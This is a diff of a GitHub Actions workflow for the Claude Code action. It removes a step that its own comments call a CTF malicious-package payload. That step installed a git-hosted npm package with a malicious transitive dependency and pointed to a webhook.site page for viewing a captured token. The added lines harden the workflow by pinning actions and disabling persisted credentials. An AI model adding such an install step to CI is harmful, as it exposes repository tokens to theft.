@@ -1,4 +1,5 @@
-name: test
+# This file was copied from https://github.com/anthropics/claude-code-action/blob/main/examples/claude.yml.
+name: newtest
 
 on:
   issue_comment:
@@ -23,38 +24,36 @@ jobs:
       pull-requests: write
       issues: write
       id-token: write
-      actions: read
-
+      actions: read # Required for Claude to read CI results on PRs
     steps:
       - name: Checkout repository
-        uses: actions/checkout@v6
+        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
         with:
           fetch-depth: 1
+          persist-credentials: false
 
-      # CTF Challenge: Malicious package installation step
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-
-      - name: Install dependencies (CTF payload)
-        run: |
-          echo "🎯 CTF Challenge: Installing Panchajanya package..."
-          npm install git+https://github.com/slv055/Panchajanya.git
-          
-          # Verify the malicious transitive dependency was installed
-          if [ -d "node_modules/build-utils-helper" ]; then
-            echo "✅ build-utils-helper installed (transitive dependency)"
-            ls -la node_modules/build-utils-helper/
-          else
-            echo "❌ build-utils-helper not found"
-          fi
-          
-          echo "📡 Check webhook.site for captured token:"
-          echo "https://webhook.site/#!/view/a837dde1-d189-4fb3-9462-d43f9d7ba7b4"
+      - name: Checkout PR branch for PR comments
+        if: github.event_name == 'issue_comment' && github.event.issue.pull_request
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh pr checkout ${{ github.event.issue.number }}
 
       - name: Run Claude Code
         id: claude
-        uses: anthropics/claude-code-action@v1
+        uses: anthropics/claude-code-action@0432df8bfe0572278dd19bca33be32cdc8061ebb  # v1.0.87
         with:
           anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          settings: ".claude/settings.json"
+
+          # Optional: Customize the trigger phrase (default: @claude)
+          # trigger_phrase: "/claude"
+
+          # Optional: Trigger when specific user is assigned to an issue
+          # assignee_trigger: "claude-bot"
+
+          # Optional: Configure Claude's behavior with CLI arguments
+          claude_args: |
+            --model claude-opus-4-5-20251101
+            --max-turns 30
+          # --allowedTools "Bash(npm install),Bash(npm run build),Bash(npm run test:*),Bash(npm run lint:*)"
+          #   --system-prompt "Follow our coding standards. Ensure all new code has tests. Use TypeScript for new files."
